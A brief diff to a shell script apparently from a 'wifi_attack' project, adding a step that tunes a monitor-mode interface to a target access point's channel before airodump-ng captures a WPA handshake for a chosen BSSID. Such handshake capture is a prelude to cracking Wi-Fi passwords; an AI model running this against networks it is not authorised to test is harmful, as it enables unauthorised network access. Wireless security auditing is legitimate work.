@@ -503,6 +503,9 @@ cd wifi_attack
 ####################################################################################################
 
 listen_for_wpa_handshake() {
+    # Set the wireless interface to the channel of the AP
+    airmon-ng start $MON_INTERFACE $CHANNEL &> /dev/null
+    
     # Start capturing frames without displaying output
     airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w captured_handshake/handshake_capture "$MON_INTERFACE" &> captured_handshake/airodump_output.txt &
     if [[ $? -ne 0 ]]; then
